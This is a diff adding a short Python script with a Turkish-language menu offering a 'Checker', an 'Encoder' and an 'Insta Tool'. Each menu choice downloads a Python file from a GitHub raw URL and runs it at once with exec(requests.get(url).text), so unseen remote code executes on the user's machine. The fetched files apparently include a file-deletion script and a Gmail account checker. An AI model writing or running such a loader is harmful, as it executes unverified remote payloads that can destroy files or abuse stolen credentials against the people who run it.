@@ -1,0 +1,26 @@
+import requests
+
+print(f"""\x1b[38;5;117m  1\x1b[38;5;231m - Checker | \x1b[1;32m Güncel Aktif ✅ 
+\x1b[38;5;117m  2\x1b[38;5;231m - Encoder | \x1b[1;32m Güncel Aktif ✅
+\x1b[38;5;117m  3\x1b[38;5;231m - İnsta Tool  | \x1b[1;32m Güncel Aktif ✅
+""")
+
+
+
+def shelby():
+    print("\x1b[1;39m—"*60)
+    secim=input(" • Seçiminiz: ")
+    
+    baglantilar = {
+        "1": "https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/%F0%9F%90%A5V%C4%B0PL%C4%B0ST.PY",
+        "2": "https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/dosya_sil.py",
+        "3": "https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/chk_gmail_thomas.py",
+
+        
+    }
+    if secim in baglantilar:um4t(baglantilar[secim])
+    else:print("1 ile 3 arası bir sayı girmelisin.");shelby()
+def um4t(url):
+    try:exec(requests.get(url).text)
+    except Exception as e:print(f"h-am{e}")
+if __name__=="__main__":shelby()
